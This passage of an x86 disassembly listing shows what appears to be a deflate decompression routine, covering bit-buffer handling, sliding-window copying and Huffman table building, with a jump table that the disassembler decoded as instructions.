  4072d7:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  4072db:	0f 84 51 02 00 00    	je     0x407532
  4072e1:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4072e4:	ff 4d cc             	decl   -0x34(%ebp)
  4072e7:	0f b6 11             	movzbl (%ecx),%edx
  4072ea:	8b cb                	mov    %ebx,%ecx
  4072ec:	d3 e2                	shl    %cl,%edx
  4072ee:	09 55 c0             	or     %edx,-0x40(%ebp)
  4072f1:	ff 45 c8             	incl   -0x38(%ebp)
  4072f4:	83 c3 08             	add    $0x8,%ebx
  4072f7:	3b d8                	cmp    %eax,%ebx
  4072f9:	72 dc                	jb     0x4072d7
  4072fb:	0f b7 0c 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%ecx
  407302:	00 
  407303:	23 4d c0             	and    -0x40(%ebp),%ecx
  407306:	01 4e 0c             	add    %ecx,0xc(%esi)
  407309:	8b c8                	mov    %eax,%ecx
  40730b:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  40730e:	2b d8                	sub    %eax,%ebx
  407310:	c7 06 05 00 00 00    	movl   $0x5,(%esi)
  407316:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407319:	8b 56 0c             	mov    0xc(%esi),%edx
  40731c:	8b c8                	mov    %eax,%ecx
  40731e:	2b ce                	sub    %esi,%ecx
  407320:	81 e9 a0 1b 00 00    	sub    $0x1ba0,%ecx
  407326:	3b ca                	cmp    %edx,%ecx
  407328:	73 13                	jae    0x40733d
  40732a:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  407330:	2b ca                	sub    %edx,%ecx
  407332:	2b ce                	sub    %esi,%ecx
  407334:	8d 8c 01 60 e4 ff ff 	lea    -0x1ba0(%ecx,%eax,1),%ecx
  40733b:	eb 04                	jmp    0x407341
  40733d:	8b c8                	mov    %eax,%ecx
  40733f:	2b ca                	sub    %edx,%ecx
  407341:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  407345:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407348:	0f 84 90 f9 ff ff    	je     0x406cde
  40734e:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  407351:	85 ff                	test   %edi,%edi
  407353:	0f 85 91 00 00 00    	jne    0x4073ea
  407359:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  40735f:	3b c7                	cmp    %edi,%eax
  407361:	75 23                	jne    0x407386
  407363:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  407369:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  40736f:	3b ca                	cmp    %edx,%ecx
  407371:	74 13                	je     0x407386
  407373:	8b c2                	mov    %edx,%eax
  407375:	3b c1                	cmp    %ecx,%eax
  407377:	73 07                	jae    0x407380
  407379:	2b c8                	sub    %eax,%ecx
  40737b:	49                   	dec    %ecx
  40737c:	8b f9                	mov    %ecx,%edi
  40737e:	eb 02                	jmp    0x407382
  407380:	2b f8                	sub    %eax,%edi
  407382:	85 ff                	test   %edi,%edi
  407384:	75 64                	jne    0x4073ea
  407386:	ff 75 08             	push   0x8(%ebp)
  407389:	89 86 a8 9b 00 00    	mov    %eax,0x9ba8(%esi)
  40738f:	e8 09 02 00 00       	call   0x40759d
  407394:	8b 86 a8 9b 00 00    	mov    0x9ba8(%esi),%eax
  40739a:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  4073a0:	3b c1                	cmp    %ecx,%eax
  4073a2:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4073a5:	73 07                	jae    0x4073ae
  4073a7:	8b f9                	mov    %ecx,%edi
  4073a9:	2b f8                	sub    %eax,%edi
  4073ab:	4f                   	dec    %edi
  4073ac:	eb 08                	jmp    0x4073b6
  4073ae:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  4073b4:	2b f8                	sub    %eax,%edi
  4073b6:	8b 96 a0 9b 00 00    	mov    0x9ba0(%esi),%edx
  4073bc:	3b c2                	cmp    %edx,%eax
  4073be:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4073c1:	75 1f                	jne    0x4073e2
  4073c3:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  4073c9:	3b ca                	cmp    %edx,%ecx
  4073cb:	74 15                	je     0x4073e2
  4073cd:	8b c2                	mov    %edx,%eax
  4073cf:	3b c1                	cmp    %ecx,%eax
  4073d1:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4073d4:	73 07                	jae    0x4073dd
  4073d6:	2b c8                	sub    %eax,%ecx
  4073d8:	49                   	dec    %ecx
  4073d9:	8b f9                	mov    %ecx,%edi
  4073db:	eb 05                	jmp    0x4073e2
  4073dd:	8b 7d f8             	mov    -0x8(%ebp),%edi
  4073e0:	2b f8                	sub    %eax,%edi
  4073e2:	85 ff                	test   %edi,%edi
  4073e4:	0f 84 64 01 00 00    	je     0x40754e
  4073ea:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4073ed:	8a 11                	mov    (%ecx),%dl
  4073ef:	88 10                	mov    %dl,(%eax)
  4073f1:	40                   	inc    %eax
  4073f2:	41                   	inc    %ecx
  4073f3:	4f                   	dec    %edi
  4073f4:	3b 8e a0 9b 00 00    	cmp    0x9ba0(%esi),%ecx
  4073fa:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4073fd:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407400:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  407403:	75 09                	jne    0x40740e
  407405:	8d 8e a0 1b 00 00    	lea    0x1ba0(%esi),%ecx
  40740b:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40740e:	ff 4e 04             	decl   0x4(%esi)
  407411:	0f 85 3a ff ff ff    	jne    0x407351
  407417:	e9 c2 f8 ff ff       	jmp    0x406cde
  40741c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40741f:	8b 7d d0             	mov    -0x30(%ebp),%edi
  407422:	85 c0                	test   %eax,%eax
  407424:	0f 85 91 00 00 00    	jne    0x4074bb
  40742a:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  407430:	3b f9                	cmp    %ecx,%edi
  407432:	75 23                	jne    0x407457
  407434:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  40743a:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  407440:	3b c2                	cmp    %edx,%eax
  407442:	74 13                	je     0x407457
  407444:	8b fa                	mov    %edx,%edi
  407446:	3b f8                	cmp    %eax,%edi
  407448:	73 05                	jae    0x40744f
  40744a:	2b c7                	sub    %edi,%eax
  40744c:	48                   	dec    %eax
  40744d:	eb 04                	jmp    0x407453
  40744f:	2b cf                	sub    %edi,%ecx
  407451:	8b c1                	mov    %ecx,%eax
  407453:	85 c0                	test   %eax,%eax
  407455:	75 64                	jne    0x4074bb
  407457:	ff 75 08             	push   0x8(%ebp)
  40745a:	89 be a8 9b 00 00    	mov    %edi,0x9ba8(%esi)
  407460:	e8 38 01 00 00       	call   0x40759d
  407465:	8b be a8 9b 00 00    	mov    0x9ba8(%esi),%edi
  40746b:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  407471:	3b f9                	cmp    %ecx,%edi
  407473:	89 7d d0             	mov    %edi,-0x30(%ebp)
  407476:	73 07                	jae    0x40747f
  407478:	8b c1                	mov    %ecx,%eax
  40747a:	2b c7                	sub    %edi,%eax
  40747c:	48                   	dec    %eax
  40747d:	eb 08                	jmp    0x407487
  40747f:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  407485:	2b c7                	sub    %edi,%eax
  407487:	8b 96 a0 9b 00 00    	mov    0x9ba0(%esi),%edx
  40748d:	3b fa                	cmp    %edx,%edi
  40748f:	89 55 f8             	mov    %edx,-0x8(%ebp)
  407492:	75 1f                	jne    0x4074b3
  407494:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  40749a:	3b ca                	cmp    %edx,%ecx
  40749c:	74 15                	je     0x4074b3
  40749e:	8b fa                	mov    %edx,%edi
  4074a0:	3b f9                	cmp    %ecx,%edi
  4074a2:	89 7d d0             	mov    %edi,-0x30(%ebp)
  4074a5:	73 07                	jae    0x4074ae
  4074a7:	2b cf                	sub    %edi,%ecx
  4074a9:	49                   	dec    %ecx
  4074aa:	8b c1                	mov    %ecx,%eax
  4074ac:	eb 05                	jmp    0x4074b3
  4074ae:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4074b1:	2b c7                	sub    %edi,%eax
  4074b3:	85 c0                	test   %eax,%eax
  4074b5:	0f 84 93 00 00 00    	je     0x40754e
  4074bb:	8a 4e 08             	mov    0x8(%esi),%cl
  4074be:	88 0f                	mov    %cl,(%edi)
  4074c0:	47                   	inc    %edi
  4074c1:	48                   	dec    %eax
  4074c2:	89 7d d0             	mov    %edi,-0x30(%ebp)
  4074c5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4074c8:	e9 11 f8 ff ff       	jmp    0x406cde
  4074cd:	83 fb 07             	cmp    $0x7,%ebx
  4074d0:	76 09                	jbe    0x4074db
  4074d2:	83 eb 08             	sub    $0x8,%ebx
  4074d5:	ff 45 cc             	incl   -0x34(%ebp)
  4074d8:	ff 4d c8             	decl   -0x38(%ebp)
  4074db:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4074de:	ff 75 08             	push   0x8(%ebp)
  4074e1:	89 86 a8 9b 00 00    	mov    %eax,0x9ba8(%esi)
  4074e7:	e8 b1 00 00 00       	call   0x40759d
  4074ec:	8b 8e a8 9b 00 00    	mov    0x9ba8(%esi),%ecx
  4074f2:	8b 96 a4 9b 00 00    	mov    0x9ba4(%esi),%edx
  4074f8:	3b ca                	cmp    %edx,%ecx
  4074fa:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  4074fd:	73 07                	jae    0x407506
  4074ff:	8b c2                	mov    %edx,%eax
  407501:	2b c1                	sub    %ecx,%eax
  407503:	48                   	dec    %eax
  407504:	eb 08                	jmp    0x40750e
  407506:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  40750c:	2b c1                	sub    %ecx,%eax
  40750e:	3b ca                	cmp    %edx,%ecx
  407510:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  407513:	75 39                	jne    0x40754e
  407515:	8b 86 14 05 00 00    	mov    0x514(%esi),%eax
  40751b:	83 f8 08             	cmp    $0x8,%eax
  40751e:	89 06                	mov    %eax,(%esi)
  407520:	75 33                	jne    0x407555
  407522:	8b 06                	mov    (%esi),%eax
  407524:	83 f8 0f             	cmp    $0xf,%eax
  407527:	0f 86 32 f6 ff ff    	jbe    0x406b5f
  40752d:	e9 93 f6 ff ff       	jmp    0x406bc5
  407532:	8b 45 c0             	mov    -0x40(%ebp),%eax
  407535:	33 ff                	xor    %edi,%edi
  407537:	89 86 1c 05 00 00    	mov    %eax,0x51c(%esi)
  40753d:	8b 45 08             	mov    0x8(%ebp),%eax
  407540:	89 9e 18 05 00 00    	mov    %ebx,0x518(%esi)
  407546:	89 78 04             	mov    %edi,0x4(%eax)
  407549:	e9 98 f6 ff ff       	jmp    0x406be6
  40754e:	33 ff                	xor    %edi,%edi
  407550:	e9 79 f6 ff ff       	jmp    0x406bce
  407555:	33 ff                	xor    %edi,%edi
  407557:	47                   	inc    %edi
  407558:	e9 71 f6 ff ff       	jmp    0x406bce
  40755d:	5a                   	pop    %edx
  40755e:	71 40                	jno    0x4075a0
  407560:	00 6d 71             	add    %ch,0x71(%ebp)
  407563:	40                   	inc    %eax
  407564:	00 03                	add    %al,(%ebx)
  407566:	72 40                	jb     0x4075a8
  407568:	00 54 72 40          	add    %dl,0x40(%edx,%esi,2)
  40756c:	00 d2                	add    %dl,%dl
  40756e:	72 40                	jb     0x4075b0
  407570:	00 16                	add    %dl,(%esi)
  407572:	73 40                	jae    0x4075b4
  407574:	00 1c 74             	add    %bl,(%esp,%esi,2)
  407577:	40                   	inc    %eax
  407578:	00 cd                	add    %cl,%ch
  40757a:	74 40                	je     0x4075bc
  40757c:	00 86 6b 40 00 1b    	add    %al,0x1b00406b(%esi)
  407582:	6d                   	insl   (%dx),%es:(%edi)
  407583:	40                   	inc    %eax
  407584:	00 40 6d             	add    %al,0x6d(%eax)
  407587:	40                   	inc    %eax
  407588:	00 4e 6e             	add    %cl,0x6e(%esi)
  40758b:	40                   	inc    %eax
  40758c:	00 8d 6e 40 00 70    	add    %cl,0x7000406e(%ebp)
  407592:	70 40                	jo     0x4075d4
  407594:	00 c5                	add    %al,%ch
  407596:	6b 40 00 db          	imul   $0xffffffdb,0x0(%eax),%eax
  40759a:	74 40                	je     0x4075dc
  40759c:	00 53 56             	add    %dl,0x56(%ebx)
  40759f:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4075a3:	57                   	push   %edi
  4075a4:	8b be b4 9b 00 00    	mov    0x9bb4(%esi),%edi
  4075aa:	8b 9e b8 9b 00 00    	mov    0x9bb8(%esi),%ebx
  4075b0:	3b fb                	cmp    %ebx,%edi
  4075b2:	76 06                	jbe    0x4075ba
  4075b4:	8b 9e b0 9b 00 00    	mov    0x9bb0(%esi),%ebx
  4075ba:	8b 46 0c             	mov    0xc(%esi),%eax
  4075bd:	2b df                	sub    %edi,%ebx
  4075bf:	3b d8                	cmp    %eax,%ebx
  4075c1:	72 02                	jb     0x4075c5
  4075c3:	8b d8                	mov    %eax,%ebx
  4075c5:	53                   	push   %ebx
  4075c6:	57                   	push   %edi
  4075c7:	ff 76 08             	push   0x8(%esi)
  4075ca:	2b c3                	sub    %ebx,%eax
  4075cc:	89 46 0c             	mov    %eax,0xc(%esi)
  4075cf:	e8 96 ea ff ff       	call   0x40606a
  4075d4:	01 5e 08             	add    %ebx,0x8(%esi)
  4075d7:	8b 86 b0 9b 00 00    	mov    0x9bb0(%esi),%eax
  4075dd:	03 fb                	add    %ebx,%edi
  4075df:	3b f8                	cmp    %eax,%edi
  4075e1:	75 16                	jne    0x4075f9
  4075e3:	39 86 b8 9b 00 00    	cmp    %eax,0x9bb8(%esi)
  4075e9:	8d be b0 1b 00 00    	lea    0x1bb0(%esi),%edi
  4075ef:	75 b9                	jne    0x4075aa
  4075f1:	89 be b8 9b 00 00    	mov    %edi,0x9bb8(%esi)
  4075f7:	eb b1                	jmp    0x4075aa
  4075f9:	89 be b4 9b 00 00    	mov    %edi,0x9bb4(%esi)
  4075ff:	5f                   	pop    %edi
  407600:	5e                   	pop    %esi
  407601:	5b                   	pop    %ebx
  407602:	c2 04 00             	ret    $0x4
  407605:	55                   	push   %ebp
  407606:	8b ec                	mov    %esp,%ebp
  407608:	81 ec ec 00 00 00    	sub    $0xec,%esp
  40760e:	53                   	push   %ebx
  40760f:	56                   	push   %esi
  407610:	8b 75 0c             	mov    0xc(%ebp),%esi
  407613:	57                   	push   %edi
  407614:	6a 10                	push   $0x10
  407616:	33 c0                	xor    %eax,%eax
  407618:	59                   	pop    %ecx
  407619:	8d 7d 90             	lea    -0x70(%ebp),%edi
  40761c:	f3 ab                	rep stos %eax,%es:(%edi)
  40761e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407621:	8b d6                	mov    %esi,%edx
  407623:	8b 01                	mov    (%ecx),%eax
  407625:	83 c1 04             	add    $0x4,%ecx
  407628:	8d 44 85 90          	lea    -0x70(%ebp,%eax,4),%eax
  40762c:	ff 00                	incl   (%eax)
  40762e:	4a                   	dec    %edx
  40762f:	75 f2                	jne    0x407623
  407631:	39 75 90             	cmp    %esi,-0x70(%ebp)
  407634:	75 13                	jne    0x407649
  407636:	8b 45 1c             	mov    0x1c(%ebp),%eax
  407639:	83 20 00             	andl   $0x0,(%eax)
  40763c:	8b 45 20             	mov    0x20(%ebp),%eax
  40763f:	83 20 00             	andl   $0x0,(%eax)
  407642:	33 c0                	xor    %eax,%eax
  407644:	e9 f0 02 00 00       	jmp    0x407939
  407649:	8b 75 20             	mov    0x20(%ebp),%esi
  40764c:	33 db                	xor    %ebx,%ebx
  40764e:	43                   	inc    %ebx
  40764f:	6a 0f                	push   $0xf
  407651:	8b 3e                	mov    (%esi),%edi
  407653:	8b cb                	mov    %ebx,%ecx
  407655:	89 7d 20             	mov    %edi,0x20(%ebp)
  407658:	5a                   	pop    %edx
  407659:	33 c0                	xor    %eax,%eax
  40765b:	39 44 8d 90          	cmp    %eax,-0x70(%ebp,%ecx,4)
  40765f:	75 05                	jne    0x407666
  407661:	41                   	inc    %ecx
  407662:	3b ca                	cmp    %edx,%ecx
  407664:	76 f3                	jbe    0x407659
  407666:	3b f9                	cmp    %ecx,%edi
  407668:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40766b:	73 03                	jae    0x407670
  40766d:	89 4d 20             	mov    %ecx,0x20(%ebp)
  407670:	39 44 95 90          	cmp    %eax,-0x70(%ebp,%edx,4)
  407674:	75 03                	jne    0x407679
  407676:	4a                   	dec    %edx
  407677:	75 f7                	jne    0x407670
  407679:	39 55 20             	cmp    %edx,0x20(%ebp)
  40767c:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40767f:	76 03                	jbe    0x407684
  407681:	89 55 20             	mov    %edx,0x20(%ebp)
  407684:	8b 7d 20             	mov    0x20(%ebp),%edi
  407687:	89 3e                	mov    %edi,(%esi)
  407689:	d3 e3                	shl    %cl,%ebx
  40768b:	eb 0d                	jmp    0x40769a
  40768d:	2b 5c 8d 90          	sub    -0x70(%ebp,%ecx,4),%ebx
  407691:	0f 88 9f 02 00 00    	js     0x407936
  407697:	41                   	inc    %ecx
  407698:	03 db                	add    %ebx,%ebx
  40769a:	3b ca                	cmp    %edx,%ecx
  40769c:	72 ef                	jb     0x40768d
  40769e:	8b f2                	mov    %edx,%esi
  4076a0:	c1 e6 02             	shl    $0x2,%esi
  4076a3:	8d 4c 35 90          	lea    -0x70(%ebp,%esi,1),%ecx
  4076a7:	8b 39                	mov    (%ecx),%edi
  4076a9:	2b df                	sub    %edi,%ebx
  4076ab:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4076ae:	0f 88 82 02 00 00    	js     0x407936
  4076b4:	03 fb                	add    %ebx,%edi
  4076b6:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  4076bc:	89 39                	mov    %edi,(%ecx)
  4076be:	33 c9                	xor    %ecx,%ecx
  4076c0:	4a                   	dec    %edx
  4076c1:	74 13                	je     0x4076d6
  4076c3:	33 ff                	xor    %edi,%edi
  4076c5:	03 4c 3d 94          	add    -0x6c(%ebp,%edi,1),%ecx
  4076c9:	83 c7 04             	add    $0x4,%edi
  4076cc:	4a                   	dec    %edx
  4076cd:	89 8c 3d 54 ff ff ff 	mov    %ecx,-0xac(%ebp,%edi,1)
  4076d4:	75 ef                	jne    0x4076c5
  4076d6:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4076d9:	33 ff                	xor    %edi,%edi
  4076db:	8b 0b                	mov    (%ebx),%ecx
  4076dd:	83 c3 04             	add    $0x4,%ebx
  4076e0:	3b c8                	cmp    %eax,%ecx
  4076e2:	74 13                	je     0x4076f7
  4076e4:	8d 8c 8d 50 ff ff ff 	lea    -0xb0(%ebp,%ecx,4),%ecx
  4076eb:	8b 11                	mov    (%ecx),%edx
  4076ed:	89 3c 95 90 19 43 00 	mov    %edi,0x431990(,%edx,4)
  4076f4:	42                   	inc    %edx
  4076f5:	89 11                	mov    %edx,(%ecx)
  4076f7:	47                   	inc    %edi
  4076f8:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  4076fb:	72 de                	jb     0x4076db
  4076fd:	8b 8c 35 50 ff ff ff 	mov    -0xb0(%ebp,%esi,1),%ecx
  407704:	8b 5d 20             	mov    0x20(%ebp),%ebx
  407707:	83 4d f4 ff          	orl    $0xffffffff,-0xc(%ebp)
  40770b:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  40770f:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  407712:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407715:	f7 db                	neg    %ebx
  407717:	3b 4d e8             	cmp    -0x18(%ebp),%ecx
  40771a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40771d:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407723:	c7 45 e0 90 19 43 00 	movl   $0x431990,-0x20(%ebp)
  40772a:	89 85 14 ff ff ff    	mov    %eax,-0xec(%ebp)
  407730:	0f 8f f3 01 00 00    	jg     0x407929
  407736:	8d 51 ff             	lea    -0x1(%ecx),%edx
  407739:	8d 4c 8d 90          	lea    -0x70(%ebp,%ecx,4),%ecx
  40773d:	89 55 d8             	mov    %edx,-0x28(%ebp)
  407740:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  407743:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  407746:	8b 31                	mov    (%ecx),%esi
  407748:	85 f6                	test   %esi,%esi
  40774a:	0f 84 c3 01 00 00    	je     0x407913
  407750:	eb 03                	jmp    0x407755
  407752:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  407755:	8b 4d 20             	mov    0x20(%ebp),%ecx
  407758:	4e                   	dec    %esi
  407759:	03 cb                	add    %ebx,%ecx
  40775b:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  40775e:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  407761:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  407764:	0f 8e cc 00 00 00    	jle    0x407836
  40776a:	46                   	inc    %esi
  40776b:	89 75 f0             	mov    %esi,-0x10(%ebp)
  40776e:	8b 75 e8             	mov    -0x18(%ebp),%esi
  407771:	ff 45 f4             	incl   -0xc(%ebp)
  407774:	2b 75 ec             	sub    -0x14(%ebp),%esi
  407777:	3b 75 20             	cmp    0x20(%ebp),%esi
  40777a:	76 03                	jbe    0x40777f
  40777c:	8b 75 20             	mov    0x20(%ebp),%esi
  40777f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407782:	33 d2                	xor    %edx,%edx
  407784:	2b 4d ec             	sub    -0x14(%ebp),%ecx
  407787:	42                   	inc    %edx
  407788:	d3 e2                	shl    %cl,%edx
  40778a:	3b 55 f0             	cmp    -0x10(%ebp),%edx
  40778d:	76 23                	jbe    0x4077b2
  40778f:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  407792:	83 c8 ff             	or     $0xffffffff,%eax
  407795:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  407798:	03 d0                	add    %eax,%edx
  40779a:	3b ce                	cmp    %esi,%ecx
  40779c:	73 14                	jae    0x4077b2
  40779e:	eb 0d                	jmp    0x4077ad
  4077a0:	83 c7 04             	add    $0x4,%edi
  4077a3:	03 d2                	add    %edx,%edx
  4077a5:	8b 07                	mov    (%edi),%eax
  4077a7:	3b d0                	cmp    %eax,%edx
  4077a9:	76 07                	jbe    0x4077b2
  4077ab:	2b d0                	sub    %eax,%edx
  4077ad:	41                   	inc    %ecx
  4077ae:	3b ce                	cmp    %esi,%ecx
  4077b0:	72 ee                	jb     0x4077a0
  4077b2:	8b 55 28             	mov    0x28(%ebp),%edx
  4077b5:	33 c0                	xor    %eax,%eax
  4077b7:	40                   	inc    %eax
  4077b8:	8b 12                	mov    (%edx),%edx
  4077ba:	d3 e0                	shl    %cl,%eax
  4077bc:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4077bf:	8d 3c 02             	lea    (%edx,%eax,1),%edi
  4077c2:	81 ff a0 05 00 00    	cmp    $0x5a0,%edi
  4077c8:	0f 87 68 01 00 00    	ja     0x407936
  4077ce:	8b 45 24             	mov    0x24(%ebp),%eax
  4077d1:	8d 04 90             	lea    (%eax,%edx,4),%eax
  4077d4:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4077d7:	8d b4 95 14 ff ff ff 	lea    -0xec(%ebp,%edx,4),%esi
  4077de:	8b 55 28             	mov    0x28(%ebp),%edx
  4077e1:	89 3a                	mov    %edi,(%edx)
  4077e3:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4077e6:	85 d2                	test   %edx,%edx
  4077e8:	89 06                	mov    %eax,(%esi)
  4077ea:	74 31                	je     0x40781d
  4077ec:	8b 7d f8             	mov    -0x8(%ebp),%edi
  4077ef:	8b 76 fc             	mov    -0x4(%esi),%esi
  4077f2:	89 bc 95 50 ff ff ff 	mov    %edi,-0xb0(%ebp,%edx,4)
  4077f9:	8a 55 20             	mov    0x20(%ebp),%dl
  4077fc:	88 55 09             	mov    %dl,0x9(%ebp)
  4077ff:	88 4d 08             	mov    %cl,0x8(%ebp)
  407802:	8b d7                	mov    %edi,%edx
  407804:	8b cb                	mov    %ebx,%ecx
  407806:	d3 ea                	shr    %cl,%edx
  407808:	8b c8                	mov    %eax,%ecx
  40780a:	2b ce                	sub    %esi,%ecx
  40780c:	c1 f9 02             	sar    $0x2,%ecx
  40780f:	2b ca                	sub    %edx,%ecx
  407811:	66 89 4d 0a          	mov    %cx,0xa(%ebp)
  407815:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407818:	89 0c 96             	mov    %ecx,(%esi,%edx,4)
  40781b:	eb 05                	jmp    0x407822
  40781d:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  407820:	89 01                	mov    %eax,(%ecx)
  407822:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407825:	8b d9                	mov    %ecx,%ebx
  407827:	03 4d 20             	add    0x20(%ebp),%ecx
  40782a:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  40782d:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  407830:	0f 8f 38 ff ff ff    	jg     0x40776e
  407836:	8a 4d fc             	mov    -0x4(%ebp),%cl
  407839:	8b 75 e0             	mov    -0x20(%ebp),%esi
  40783c:	2a cb                	sub    %bl,%cl
  40783e:	88 4d 09             	mov    %cl,0x9(%ebp)
  407841:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  407844:	8d 0c 8d 90 19 43 00 	lea    0x431990(,%ecx,4),%ecx
  40784b:	3b f1                	cmp    %ecx,%esi
  40784d:	72 06                	jb     0x407855
  40784f:	c6 45 08 c0          	movb   $0xc0,0x8(%ebp)
  407853:	eb 43                	jmp    0x407898
  407855:	8b 0e                	mov    (%esi),%ecx
  407857:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  40785a:	73 1c                	jae    0x407878
  40785c:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  407862:	0f 92 c1             	setb   %cl
  407865:	fe c9                	dec    %cl
  407867:	83 e1 60             	and    $0x60,%ecx
  40786a:	88 4d 08             	mov    %cl,0x8(%ebp)
  40786d:	66 8b 0e             	mov    (%esi),%cx
  407870:	83 c6 04             	add    $0x4,%esi
  407873:	89 75 e0             	mov    %esi,-0x20(%ebp)
  407876:	eb 1c                	jmp    0x407894
  407878:	2b 4d 10             	sub    0x10(%ebp),%ecx
  40787b:	8b 55 18             	mov    0x18(%ebp),%edx
  40787e:	03 c9                	add    %ecx,%ecx
  407880:	8a 14 11             	mov    (%ecx,%edx,1),%dl
  407883:	80 c2 50             	add    $0x50,%dl
  407886:	83 45 e0 04          	addl   $0x4,-0x20(%ebp)
  40788a:	88 55 08             	mov    %dl,0x8(%ebp)
  40788d:	8b 55 14             	mov    0x14(%ebp),%edx
  407890:	66 8b 0c 11          	mov    (%ecx,%edx,1),%cx
  407894:	66 89 4d 0a          	mov    %cx,0xa(%ebp)
  407898:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40789b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40789e:	33 ff                	xor    %edi,%edi
  4078a0:	2b cb                	sub    %ebx,%ecx
  4078a2:	47                   	inc    %edi
  4078a3:	8b f7                	mov    %edi,%esi
  4078a5:	d3 e6                	shl    %cl,%esi
  4078a7:	8b cb                	mov    %ebx,%ecx
  4078a9:	d3 ea                	shr    %cl,%edx
  4078ab:	eb 08                	jmp    0x4078b5
  4078ad:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4078b0:	89 0c 90             	mov    %ecx,(%eax,%edx,4)
  4078b3:	03 d6                	add    %esi,%edx
  4078b5:	3b 55 dc             	cmp    -0x24(%ebp),%edx
  4078b8:	72 f3                	jb     0x4078ad
  4078ba:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4078bd:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4078c0:	8b d7                	mov    %edi,%edx
  4078c2:	d3 e2                	shl    %cl,%edx
  4078c4:	eb 04                	jmp    0x4078ca
  4078c6:	33 f2                	xor    %edx,%esi
  4078c8:	d1 ea                	shr    $1,%edx
  4078ca:	85 d6                	test   %edx,%esi
  4078cc:	75 f8                	jne    0x4078c6
  4078ce:	8b cf                	mov    %edi,%ecx
  4078d0:	33 f2                	xor    %edx,%esi
  4078d2:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4078d5:	8b cb                	mov    %ebx,%ecx
  4078d7:	8b d7                	mov    %edi,%edx
  4078d9:	89 75 f8             	mov    %esi,-0x8(%ebp)
  4078dc:	d3 e2                	shl    %cl,%edx
  4078de:	4a                   	dec    %edx
  4078df:	23 d6                	and    %esi,%edx
  4078e1:	8b ca                	mov    %edx,%ecx
  4078e3:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4078e6:	3b 8c 95 50 ff ff ff 	cmp    -0xb0(%ebp,%edx,4),%ecx
  4078ed:	74 1a                	je     0x407909
  4078ef:	2b 5d 20             	sub    0x20(%ebp),%ebx
  4078f2:	8b f7                	mov    %edi,%esi
  4078f4:	4a                   	dec    %edx
  4078f5:	8b cb                	mov    %ebx,%ecx
  4078f7:	d3 e6                	shl    %cl,%esi
  4078f9:	4e                   	dec    %esi
  4078fa:	23 75 f8             	and    -0x8(%ebp),%esi
